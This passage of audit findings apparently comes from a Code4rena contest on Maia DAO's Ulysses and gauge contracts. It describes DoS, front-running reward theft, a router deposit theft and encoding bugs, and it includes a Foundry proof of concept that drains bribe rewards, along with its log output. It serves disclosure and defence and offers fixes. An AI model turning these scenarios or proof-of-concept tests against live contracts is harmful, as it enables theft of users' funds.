`_gasSwapIn()` and `_gasSwapOut()` with `SafeCastLib.toUint128()`.  ## Impact Several external functions in `RootBridgeAgent` (such as `anyExecute()`,  `callOut()`, `callOutAndBridge()`, `callOutAndBridgeMultiple()`, etc) are affected by this issue. That means `RootBridgeAgent` will not function properly at all causing a DoS of the Ulysses Omnichain.  ## Detailed Explanation `UniSwapV3Pool.swap()` returns a negative value for exact input swap (see documentation in link below).  https://docs.uniswap.org/contracts/v3/reference/core/UniswapV3Pool#swap  And this is evident in UniswapV3's `SwapRouter.sol`, which shows that the returned value is negated before casting to `uint256`. https://github.com/Uniswap/v3-periphery/blob/main/contracts/SwapRouter.sol#L111  ```Solidity     function exactInputInternal(         uint256 amountIn,         address recipient,         uint160 sqrtPriceLimitX96,         SwapCallbackData memory data     ) private returns (uint256 amountOut) {          ...          (int256 amount0, int256 amount1) =             getPool(tokenIn, tokenOut, fee).swap(                 recipient,                 zeroForOne,                 amountIn.toInt256(),                 sqrtPriceLimitX96 == 0                     ? (zeroForOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1)                     : sqrtPriceLimitX96,                 abi.encode(data)             );          //@audit return values amount0 and amount1 are negated before casting to uint256         return uint256(-(zeroForOne ? amount1 : amount0));     } ```   However, both `RootBridgeAgent._gasSwapIn()` and `RootBridgeAgent._gasSwapOut()` do not negate the returned value before casting to `uint256`.    ```Solidity     function _gasSwapIn(uint256 _amount, uint24 _fromChain) internal returns (uint256) {         ...          try IUniswapV3Pool(poolAddress).swap(             address(this),             zeroForOneOnInflow,             int256(_amount),             sqrtPriceLimitX96,             abi.encode(SwapCallbackData({tokenIn: gasTokenGlobalAddress}))         ) returns (int256 amount0, int256 amount1) {             //@audit missing negation of amount0/amount1 before casting to uint256             return uint256(zeroForOneOnInflow ? amount1 : amount0);         } catch (bytes memory) {             _forceRevert();             return 0;         }     }       function _gasSwapOut(uint256 _amount, uint24 _toChain) internal returns (uint256, address) {         ...          //Swap imbalanced token as long as we haven't used the entire amountSpecified and haven't reached the price limit         (int256 amount0, int256 amount1) = IUniswapV3Pool(poolAddress).swap(             address(this),             !zeroForOneOnInflow,             int256(_amount),             sqrtPriceLimitX96,             abi.encode(SwapCallbackData({tokenIn: address(wrappedNativeToken)}))         );          //@audit missing negation of amount0/amount1 before casting to uint256         return (uint256(!zeroForOneOnInflow ? amount1 : amount0), gasTokenGlobalAddress);     } ```  In `anyExecute()` and `_manageGasOut()` , both return value of `_gasSwapIn()` and `_gasSwapOut()` are converted using `SafeCastLib.toUint128()`. That means these calls will revert due to overflow, as casting a negative `int256` value to `uint256` will result in a large value exceeding `uint128`.  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L884-L886 ```Solidity     function anyExecute(bytes calldata data)         external         virtual         requiresExecutor         returns (bool success, bytes memory result)     {         ...             //@audit SafeCastLib.toUint128() will revert due to large return value from _gasSwapIn()             //Swap in all deposited Gas             _userFeeInfo.depositedGas = _gasSwapIn(                 uint256(uint128(bytes16(data[data.length - PARAMS_GAS_IN:data.length - PARAMS_GAS_OUT]))), fromChainId             ).toUint128();     } ```  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/RootBridgeAgent.sol#L757-L767 ```Solidity     function _manageGasOut(uint24 _toChain) internal returns (uint128) {         ...          if (_initialGas > 0) {             if (userFeeInfo.gasToBridgeOut <= MIN_FALLBACK_RESERVE * tx.gasprice) revert InsufficientGasForFees();             (amountOut, gasToken) = _gasSwapOut(userFeeInfo.gasToBridgeOut, _toChain);         } else {             if (msg.value <= MIN_FALLBACK_RESERVE * tx.gasprice) revert InsufficientGasForFees();             wrappedNativeToken.deposit{value: msg.value}();             (amountOut, gasToken) = _gasSwapOut(msg.value, _toChain);         }          IPort(localPortAddress).burn(address(this), gasToken, amountOut, _toChain);          //@audit SafeCastLib.toUint128() will revert due to large return value from _gasSwapOut()         return amountOut.toUint128();     } ```   ## Proof of Concept First, simulate a negative return value by adding the following line to `MockPool.swap()` in [RootTest.t.sol#L1916](https://github.com/code-423n4/2023-05-maia/blob/main/test/ulysses-omnichain/RootTest.t.sol#L1916) ```Solidity         //@audit simulate UniSwapV3Pool negative return value         return (-amount0, -amount1); ```  Then run `RootTest.testCallOutWithDeposit()`, which will demonstrate that `swap()` will cause an overflow to revert `CoreRootRouter.addBranchToBridgeAgent()`, preventing `RootTest.setUp()` from completing.   ## Recommended Mitigation Steps Negate the return values of `UniswapV3Pool.swap()` in `RootBridgeAgent._gasSwapIn()` and `RootBridgeAgent._gasSwapOut()` before casting to uint256.   ## Assessed type  DoS"}, {"title": "Removing a BribeFlywheel from a Gauge does not remove the reward asset from the rewards depo, making it impossible to add a new Flywheel with the same reward token", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/214", "labels": ["bug", "3 (High Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "upgraded by judge", "H-28"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/gauges/BaseV2Gauge.sol#L144-L152   # Vulnerability details  ## Impact  Removing a bribe Flywheel (`FlywheelCore`) from a Gauge (via `BaseV2Gauge::removeBribeFlywheel`) does not remove the reward asset (call `MultiRewardsDepot::removeAsset`) from the rewards depo (`BaseV2Gauge::multiRewardsDepot`), making it impossible to add a new Flywheel (by calling `BaseV2Gauge::addBribeFlywheel`) with the same reward token (because `MultiRewardsDepot::addAsset` reverts as the assets already exists).  Impact is limiting protocol functionality in unwanted ways, possibly impacting gains in the long run. Example due to incentives lost by not having a specific token bribe reward.  ## Proof of Concept  _Observation: a `BribeFlywheel` is a `FlywheelCore` with a `FlywheelBribeRewards` set as the `FlywheelRewards`, typically created using the `BribesFactory::createBribeFlywheel`_  ### Scenario and execution flow  - project decides to add an initial  `BribeFlywheel` to the recently deployed `UniswapV3Gauge` contract. - this is done by calling [`UniswapV3GaugeFactory::BaseV2GaugeFactory::addBribeToGauge`](https://github.com/code-423n4/2023-05-maia/blob/main/src/gauges/factories/BaseV2GaugeFactory.sol#L144-L148)     - executions further goes to `BaseV2Gauge::addGaugetoFlywheel` where [the bribe flywheel reward token is added](https://github.com/code-423n4/2023-05-maia/blob/main/src/gauges/BaseV2Gauge.sol#L135) to the multi reward depo - project decides, for whatever reason (a bug in the contract, an exploit, a decommission, a more profitable wheel that would use the same rewards token), that they want to replace the old flywheel with a new one - removing is done via calling [`UniswapV3GaugeFactory::BaseV2GaugeFactory::removeBribeFromGauge`](https://github.com/code-423n4/2023-05-maia/blob/main/src/gauges/factories/BaseV2GaugeFactory.sol#L151-L154)     - executions further goes to `BaseV2Gauge::removeBribeFlywheel` where the flywheel is removed but the reward token asset [is not remove from the multi reward depo](https://github.com/code-423n4/2023-05-maia/blob/main/src/gauges/BaseV2Gauge.sol#L144-L152), there is no call to [`MultiRewardsDepot::removeAsset`](https://github.com/code-423n4/2023-05-maia/blob/main/src/rewards/depots/MultiRewardsDepot.sol#L57-L65):  ```Solidity     function removeBribeFlywheel(FlywheelCore bribeFlywheel) external onlyOwner {         /// @dev Can only remove active flywheels         if (!isActive[bribeFlywheel]) revert FlywheelNotActive();          /// @dev This is permanent; can't be re-added         delete isActive[bribeFlywheel];          emit RemoveBribeFlywheel(bribeFlywheel);     } ``` - after removal, when trying to add a new flywheel with the same rewards token, execution fails with `ErrorAddingAsset` since the [`addAsset`](https://github.com/code-423n4/2023-05-maia/blob/main/src/gauges/BaseV2Gauge.sol#L135) call reverts since [the rewards token was not removed](https://github.com/code-423n4/2023-05-maia/blob/main/src/rewards/depots/MultiRewardsDepot.sol#L48) with the previous call to `BaseV2Gauge::removeBribeFlywheel`.  ## Tools Used  Manual analysis  ## Recommended Mitigation Steps  when `BaseV2Gauge::removeBribeFlywheel` is called for a particular flywheel, also remove it's corresponding reward depo token.  Example implementation ```diff diff --git a/src/gauges/BaseV2Gauge.sol b/src/gauges/BaseV2Gauge.sol index c2793a7..8ea6c1e 100644 --- a/src/gauges/BaseV2Gauge.sol +++ b/src/gauges/BaseV2Gauge.sol @@ -148,6 +148,9 @@ abstract contract BaseV2Gauge is Ownable, IBaseV2Gauge {          /// @dev This is permanent; can't be re-added          delete isActive[bribeFlywheel];   +        address flyWheelRewards = address(bribeFlywheel.flywheelRewards());         +        multiRewardsDepot.removeAsset(flyWheelRewards); +          emit RemoveBribeFlywheel(bribeFlywheel);      }    ```   ## Assessed type  Other"}, {"title": "Malicious user can front-run Gauges's `addBribeFlywheel` to steal bribe rewards", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/206", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "upgraded by judge", "H-29"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/rewards/rewards/FlywheelAcummulatedRewards.sol#L26 https://github.com/code-423n4/2023-05-maia/blob/main/src/rewards/rewards/FlywheelAcummulatedRewards.sol#L46-L54   # Vulnerability details  ## Impact When Gauge in initial setup and flywheel is created and added to the gauge via `addBribeFlywheel`. Malicious user can front-run this to steal rewards, this could happened due to uninitialized `endCycle` inside `FlywheelAcummulatedRewards` contract.  ## Proof of Concept Consider this scenario :  1. Gauge is first time created, then admin deposit 100 eth to depot reward. 2. FlyWheel also created, using 'FlywheelBribeRewards` that inherent `FlywheelAcummulatedRewards` implementation. 3. Malicious attacker that `addBribeFlywheel` is about to be called by owner, and front run it by calling `incrementGauge` a huge amount of gauge token to this gauge. 4. `addBribeFlywheel` is executed. 5. Now malicious user trigger `accrueBribes` and claim reward. 6. bribe rewards now stolen, malicious user can immediately decrement his gauge from this contract.  All of this possible, because `endCycle` is not initialized inside `FlywheelAcummulatedRewards` when first created :   https://github.com/code-423n4/2023-05-maia/blob/main/src/rewards/rewards/FlywheelAcummulatedRewards.sol#L26-L35  ```solidity abstract contract FlywheelAcummulatedRewards is BaseFlywheelRewards, IFlywheelAcummulatedRewards {     using SafeCastLib for uint256;      /*//////////////////////////////////////////////////////////////                         REWARDS CONTRACT STATE     //////////////////////////////////////////////////////////////*/      /// @inheritdoc IFlywheelAcummulatedRewards     uint256 public immutable override rewardsCycleLength;      /// @inheritdoc IFlywheelAcummulatedRewards     uint256 public override endCycle; // NOTE INITIALIZED INSIDE CONSTRUCTOR      /**      * @notice Flywheel Instant Rewards constructor.      *  @param _flywheel flywheel core contract      *  @param _rewardsCycleLength the length of a rewards cycle in seconds      */     constructor(FlywheelCore _flywheel, uint256 _rewardsCycleLength) BaseFlywheelRewards(_flywheel) {         rewardsCycleLength = _rewardsCycleLength;     }     ...  } ``` So right after it is created and attached to gauge, distribution of reward can be called immediately via `accrueBribes` inside gauge, if no previous user put his gauge token into this gauge contract, rewards can easily drained.  Foundry PoC (add this test inside `BaseV2GaugeTest.t.sol`) :  ```solidity     function testAccrueAndClaimBribesAbuse() external {         address alice = address(0xABCD);         MockERC20 token = new MockERC20(\"test token\", \"TKN\", 18);         FlywheelCore flywheel = createFlywheel(token);         FlywheelBribeRewards bribeRewards = FlywheelBribeRewards(             address(flywheel.flywheelRewards())         );         gaugeToken.setMaxDelegates(1);         token.mint(address(depot), 100 ether);          // ALICE SEE THAT THIS IS NEW GAUGE, about to add new NEW FLYWHEEL REWARDS          // alice put a lot of his hermes or could also get from flash loan         hermes.mint(alice, 100e18);         hevm.startPrank(alice);         hermes.approve(address(gaugeToken), 100e18);         gaugeToken.mint(alice, 100e18);         gaugeToken.delegate(alice);         gaugeToken.incrementGauge(address(gauge), 100e18);         console.log(\"hermes total supply\");         console.log(hermes.totalSupply());         hevm.stopPrank();         // NEW BRIBE FLYWHEEL IS ADDED         hevm.expectEmit(true, true, true, true);         emit AddedBribeFlywheel(flywheel);         gauge.addBribeFlywheel(flywheel);         // ALICE ACCRUE BRIBES         gauge.accrueBribes(alice);         console.log(\"bribe rewards balance before claim : \");         console.log(token.balanceOf(address(bribeRewards)));          flywheel.claimRewards(alice);         console.log(\"bribe rewards balance after claim : \");         console.log(token.balanceOf(address(bribeRewards)));          console.log(\"alice rewards balance : \");         console.log(token.balanceOf(alice));         // after steal reward, alice could just disengage from the gauge, and look for another new gauge with new flywheel         hevm.startPrank(alice);         gaugeToken.decrementGauge(address(gauge), 100e18);         hevm.stopPrank();     } ```  PoC log output :  ```   bribe rewards balance before claim :    100000000000000000000   bribe rewards balance after claim :    0   alice rewards balance :    100000000000000000000 ```  ## Tools Used  Manual review  ## Recommended Mitigation Steps  initialized `endCycle` inside `FlywheelAcummulatedRewards` :  ```solidity     constructor(         FlywheelCore _flywheel,         uint256 _rewardsCycleLength     ) BaseFlywheelRewards(_flywheel) {         rewardsCycleLength = _rewardsCycleLength;         endCycle = ((block.timestamp.toUint32() + rewardsCycleLength) /                 rewardsCycleLength) * rewardsCycleLength;             } ```   ## Assessed type  Other"}, {"title": "Incorrect flow of adding liquidity in UlyssesRouter.sol", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/201", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-30"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-amm/UlyssesRouter.sol#L49-L56   # Vulnerability details  ## Impact Usually router in AMM is stateless, i.e. it isn't supposed to contain any tokens, it is just wrapper of low-level pool functions to perform user-friendly interaction. Current implementation of `addLiquidity()` assumes that user firstly transfers tokens to router and then router performs deposit to pool. However it is not atomic and requires two transactions. Another user can break in after the first transaction and deposit someone else's tokens.  ## Proof of Concept Router calls deposit with msg.sender as receiver of shares: https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-amm/UlyssesRouter.sol#L49-L56 ```solidity     function addLiquidity(uint256 amount, uint256 minOutput, uint256 poolId) external returns (uint256) {         UlyssesPool ulysses = getUlyssesLP(poolId);          amount = ulysses.deposit(amount, msg.sender);          if (amount < minOutput) revert OutputTooLow();         return amount;     } ``` In deposit pool transfers tokens from msg.sender, which is router: https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-4626/UlyssesERC4626.sol#L34-L45 ```solidity     function deposit(uint256 assets, address receiver) public virtual nonReentrant returns (uint256 shares) {         // Need to transfer before minting or ERC777s could reenter.         asset.safeTransferFrom(msg.sender, address(this), assets);          shares = beforeDeposit(assets);          require(shares != 0, \"ZERO_SHARES\");          _mint(receiver, shares);          emit Deposit(msg.sender, receiver, assets, shares);     } ```  First user will lose tokens sent to router, if malicious user calls `addLiquidity()` after it  ## Tools Used Manual Review  ## Recommended Mitigation Steps Transfer tokens to router via `safeTransferFrom()`: ```solidity     function addLiquidity(uint256 amount, uint256 minOutput, uint256 poolId) external returns (uint256) {         UlyssesPool ulysses = getUlyssesLP(poolId);         address(ulysses.asset()).safeTransferFrom(msg.sender, address(this), amount);          amount = ulysses.deposit(amount, msg.sender);          if (amount < minOutput) revert OutputTooLow();         return amount;     } ```      ## Assessed type  Access Control"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/198", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-14"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/lukejohn-Q.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/197", "labels": ["grade-b", "satisfactory", "sponsor confirmed", "analysis"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/erebus-Analysis.md)."}, {"title": "ERC4626PartnerManager.sol mints extra `partnerGovernance` tokens to itself, resulting in over supply of governance token", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/191", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-39"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/maia/tokens/ERC4626PartnerManager.sol#L226   # Vulnerability details  ## Impact ERC4626PartnerManager mints more tokens than needed when `bHermesRate` increased. 1) I suppose it can break voting in which this token is used. Because totalSupply is increased, more and more tokens are stuck in contract after every increasing of `bHermesRate`. 2) The second concern is that all this tokens are approved to `partnerVault` contract and can be extracted. But implementation of partnerVault is out of scope and I don't know is it possible. But this token excess exists in ERC4626PartnerManager.sol  ## Proof of Concept Token amount to mint is difference between totalSupply * newRate and balance of this contract. ```solidity     function increaseConversionRate(uint256 newRate) external onlyOwner {         if (newRate < bHermesRate) revert InvalidRate();          if (newRate > (address(bHermesToken).balanceOf(address(this)) / totalSupply)) {             revert InsufficientBacking();         }          bHermesRate = newRate;          partnerGovernance.mint(             address(this), totalSupply * newRate - address(partnerGovernance).balanceOf(address(this))         );         bHermesToken.claimOutstanding();     } ``` However it is wrong to account balance of address(this) because it decreases every claim. Let me explain.  Suppose bHermesRate = 10, balance of bHermes is 50, totalSupply is 0 (nobody interacted yet) 1) User1 deposits 5 MAIA, therefore mints 5 vMAIA and mints 5 * 10 = 50 `govToken` ```solidity     function _mint(address to, uint256 amount) internal virtual override {         if (amount > maxMint(to)) revert ExceedsMaxDeposit();         bHermesToken.claimOutstanding();          ERC20MultiVotes(partnerGovernance).mint(address(this), amount * bHermesRate);         super._mint(to, amount);     } ``` 2) Admin calls `increaseConversionRate(11)`, ie increases rate by 1. This function will mint 5 * 11 - 0 = 55 tokens, but should mint only 5 * (11 - 10) = 5 ```solidity         partnerGovernance.mint(             address(this), totalSupply * newRate - address(partnerGovernance).balanceOf(address(this))         ); ```  ## Tools Used Manual Review  ## Recommended Mitigation Steps Refactor function to ```solidity     function increaseConversionRate(uint256 newRate) external onlyOwner {         if (newRate < bHermesRate) revert InvalidRate();          if (newRate > (address(bHermesToken).balanceOf(address(this)) / totalSupply)) {             revert InsufficientBacking();         }          partnerGovernance.mint(             address(this), totalSupply * (newRate - bHermesRate)         );          bHermesRate = newRate;          bHermesToken.claimOutstanding();     } ```   ## Assessed type  ERC20"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/188", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "edited-by-warden", "Q-18"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/ByteBandits-Q.md)."}, {"title": "Ulysses omnichain - RetrieveDeposit might never be able to Trigger the Fallback function", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/183", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-31"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/78e49c651fd119b85bb79296620d5cb39efa7cdd/src/ulysses-omnichain/RootBridgeAgent.sol#L1141-L1156   # Vulnerability details  ## Impact The purpose of the retrieveDeposit function is to enable a user to be able to redeem a deposit he entered into the system. the mechanism works based on the promise that this function will be able to forcefully make the root bridge agent trigger the fallback function.                   if (!executionHistory[fromChainId][uint32(bytes4(data[1:5]))]) {                 //Toggle Nonce as executed                 executionHistory[fromChainId][nonce] = true;                  //Retry failed fallback                 (success, result) = (false, \"\")  by returning false, the anycall contract will attempt to trigger the fallback function in the branch bridge, which would in turn set the status of the deposit as failed. the user can then redeem his deposit because its status is now failed.          function redeemDeposit(uint32 _depositNonce) external lock {         //Update Deposit         if (getDeposit[_depositNonce].status != DepositStatus.Failed) {             revert DepositRedeemUnavailable();         }  The problem is that according to how anycall protocol works, it is completely feasible that the execution in root bridge completes succesfully, but the fallback in branch might still fail to execute.        uint256 internal constant MIN_FALLBACK_RESERVE = 185_000; // 100_000 for anycall + 85_000 fallback execution overhead  for example, the anycall to the rootbridge might succeed due to enough gas stipend, while the fallback execution fails due to low gas stipend.  if this is the case then the deposit nonce would be stored in the executionHistory during the initial call, so when the retrievedeposit call is made it, it would think that the transaction is already completed, which would trigger this block instead:                     _forceRevert();                 //Return true to avoid triggering anyFallback in case of `_forceRevert()` failure                 return (true, \"already executed tx\");   The impact of this is that if the deposit transaction is recorded in root side as completed, a user will never be able to use retrievedeposit function redeem his deposit from the system.   ## Proof of Concept                function testRetrieveDeposit() public {         //Set up         testAddLocalTokenArbitrum();          //Prepare data         bytes memory packedData;          {             Multicall2.Call[] memory calls = new Multicall2.Call[](1);              //Mock action             calls[0] = Multicall2.Call({target: 0x0000000000000000000000000000000000000000, callData:   \"\"});              //Output Params             OutputParams memory outputParams = OutputParams(address(this), newAvaxAssetGlobalAddress, 150 ether, 0);              //RLP Encode Calldata Call with no gas to bridge out and we top up.             bytes memory data = abi.encode(calls, outputParams, ftmChainId);              //Pack FuncId             packedData = abi.encodePacked(bytes1(0x02), data);         }          address _user = address(this);          //Get some gas.         hevm.deal(_user, 100 ether);         hevm.deal(address(ftmPort), 1 ether);          //assure there is enough balance for mock action         hevm.prank(address(rootPort));         ERC20hTokenRoot(newAvaxAssetGlobalAddress).mint(address(rootPort), 50 ether, rootChainId);         hevm.prank(address(avaxPort));         ERC20hTokenBranch(avaxMockAssethToken).mint(_user, 50 ether);          //Mint Underlying Token.         avaxMockAssetToken.mint(_user, 100 ether);          //Prepare deposit info                 //Prepare deposit info         DepositParams memory depositParams = DepositParams({             hToken: address(avaxMockAssethToken),             token: address(avaxMockAssetToken),             amount: 150 ether,             deposit: 100 ether,             toChain: ftmChainId,             depositNonce: 1,             depositedGas: 1 ether         });          DepositInput memory depositInput = DepositInput({             hToken: address(avaxMockAssethToken),             token: address(avaxMockAssetToken),             amount: 150 ether,             deposit: 100 ether,             toChain: ftmChainId         });          // Encode AnyFallback message         bytes memory anyFallbackData = abi.encodePacked(             bytes1(0x01),             depositParams.depositNonce,             depositParams.hToken,             depositParams.token,             depositParams.amount,             depositParams.deposit,             depositParams.toChain,             bytes(\"testdata\"),             depositParams.depositedGas,             depositParams.depositedGas / 2         );          console2.log(\"BALANCE BEFORE:\");         console2.log(\"User avaxMockAssetToken Balance:\", MockERC20(avaxMockAssetToken).balanceOf(_user));         console2.log(\"User avaxMockAssethToken Balance:\",  MockERC20(avaxMockAssethToken).balanceOf(_user));          require(avaxMockAssetToken.balanceOf(address(avaxPort)) == 0, \"balance of port is not zero\");          //Call Deposit function         avaxMockAssetToken.approve(address(avaxPort), 100 ether);         ERC20hTokenRoot(avaxMockAssethToken).approve(address(avaxPort), 50 ether);         avaxMulticallBridgeAgent.callOutSignedAndBridge{value: 50 ether}(packedData, depositInput, 0.5 ether);     ;                   avaxMulticallBridgeAgent.retrieveDeposit{value: 1 ether}(depositParams.depositNonce);           // fallback is not triggered.          // @audit Redeem Deposit, will fail with   DepositRedeemUnavailable()         avaxMulticallBridgeAgent.redeemDeposit(depositParams.depositNonce);      }  ## Tools Used Manual Review  ## Recommended Mitigation Steps  just make the root bridge return (false, \"\") regardles of whether the transaction linked to the original deposit was completed or not.        /// DEPOSIT FLAG: 8 (retrieveDeposit)     else if (flag == 0x08) {             (success, result) = (false, \"\");  to avoid also spamming the usage of the retrievedeposit function, it is advisable to add a check in the retrieveDeposit function to see whether the deposit still exists, it doesnt make sense to try and retrieve a deposit that has already been redeemed.          function retrieveDeposit(uint32 _depositNonce) external payable lock requiresFallbackGas {         address depositOwner = getDeposit[_depositNonce].owner;                  if (depositOwner == address(0)) {             revert RetrieveDepositUnavailable();         }               ## Assessed type  Other"}, {"title": "Governance relies on current totalSupply of bHermes when calculate `proposalThresholdAmount` and `quorumVotesAmount`", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/179", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-40"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/governance/GovernorBravoDelegateMaia.sol#L87-L93   # Vulnerability details  ## Impact As people mint bHermes, bHermesVotes' totalSupply grows. And `quorumVotesAmount` to execute proposal also grows. But it shouldn't, because new people can't vote for it. This behavior adds inconsistency to voting process, because changes threshold after creating proposal.  ## Proof of Concept Here you can see that Governance fetches current totalSupply: https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/governance/GovernorBravoDelegateMaia.sol#L87-L93 ```solidity     function getProposalThresholdAmount() public view returns (uint256) {         return govToken.totalSupply() * proposalThreshold / DIVISIONER;     }      function getQuorumVotesAmount() public view returns (uint256) {         return govToken.totalSupply() * quorumVotes / DIVISIONER;     } ```  bHermes is ERC4626DepositOnly and mints new govToken when user calls `deposit()` or `mint()`, thus increasing totalSupply: https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/hermes/bHermes.sol#L123-L133 ```solidity     function _mint(address to, uint256 amount) internal virtual override {         gaugeWeight.mint(address(this), amount);         gaugeBoost.mint(address(this), amount);         governance.mint(address(this), amount);         super._mint(to, amount);     } ```  ## Tools Used Manual Review  ## Recommended Mitigation Steps Add parameter `totalSupply` to Proposal struct and use it instead of current totalSupply in functions `getProposalThresholdAmount()` and `getQuorumVotesAmount()`   ## Assessed type  Governance"}, {"title": "Inconsistently reading the encoded parameters received in the _sParams argument in the BranchBridgeAgent::clearTokens()", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/173", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-41"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L565-L634   # Vulnerability details  ## Impact - token addresses could be computed wrong which could lead to get stuck the tokens in the root chain  ## Proof of Concept - The function [clearTokens()](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L565-L634) is called from the [BranchBridgeAgentExecutor::executeWithSettlementMultiple() function](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgentExecutor.sol#L116-L157), which is used when the settlement flag is 2 \"Multiple Settlements\"  - As per the [documentation about the messaging layer written in the `IBranchBridgeAgent` contract](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/interfaces/IBranchBridgeAgent.sol#L112-L136), [when the flag is 2, the structure of the token info is as follows](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/interfaces/IBranchBridgeAgent.sol#L135):  ```  *           - ht = hToken  *           - t = Token  *           - A = Amount  *           - D = Destination  *           - b = bytes  *           - n = number of assets  *           ________________________________________________________________________________________________________________________________  *          |            Flag               |           Deposit Info           |             Token Info             |   DATA   |  Gas Info   |  *          |           1 byte              |            4-25 bytes            |        (105 or 128) * n bytes      |   ---    |  16 bytes   |  *          |                               |                                  |            hT - t - A - D          |          |             |  *          |_______________________________|__________________________________|____________________________________|__________|_____________|   *          | callOutMulti = 0x2            |  1b(n) + 20b(recipient) + 4b     |         32b + 32b + 32b + 32b      |   ---    |     16b     | ```  - 3 of the 4 parameters encoded in _sParams ([hTokens](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L582-L593), [amounts](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L604-L612) and [deposits](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L613-L621)) reads the whole 32 bytes and [tokens read only 20 bytes](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L594-L603).   ## Tools Used Manual Audit  ## Recommended Mitigation Steps  - Standardize the way to read parameters from the received _sParams, if all parameters are bytes32, make sure to read all the bytes corresponding to such a parameter, and from there do the required conversions to another data types. ```solidity function clearTokens(bytes calldata _sParams, address _recipient)     ... {     ...         _tokens[i] = address(             uint160(                 bytes20(                     bytes32(                         _sParams[                             PARAMS_TKN_START + PARAMS_ENTRY_SIZE * uint16(i + numOfAssets) + 12:                                 PARAMS_TKN_START + PARAMS_ENTRY_SIZE * uint16(PARAMS_START + i + numOfAssets)                         ]                     )                      )             )         );     ... } ```   ## Assessed type  en/de-code"}, {"title": "Incorrectly reading the offset from the received data parameter to get the depositNonce in the BranchBridgeAgent::anyFallback() function", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/169", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-32"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1272-L1304   # Vulnerability details  ## Impact - Not reading the correct offset where the `depositNonce` is located can lead to set the status of the wrong deposit to Failed when the [_clearDeposit() function](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L988-L996) is called.   - The consequences of setting the incorrect `depositNonce` to False can be:     - Getting stuck the deposits of the real `depositNonce` that is sent to the anyFallback() because that `depositNonce` won't be marked as Failed.     - Causing troubles to other `depositNonces` that should not be marked as Failed.  ## Proof of Concept - The structure of the data was encoded depending on the type of operation, that means that **the `depositNonce` will be located at a different offset depending the flag.** - To see where exactly the `depositNonce` is located, is required to check the corresponding operation where the data was packed   - Depending on the type of operation (flag) it will be the function 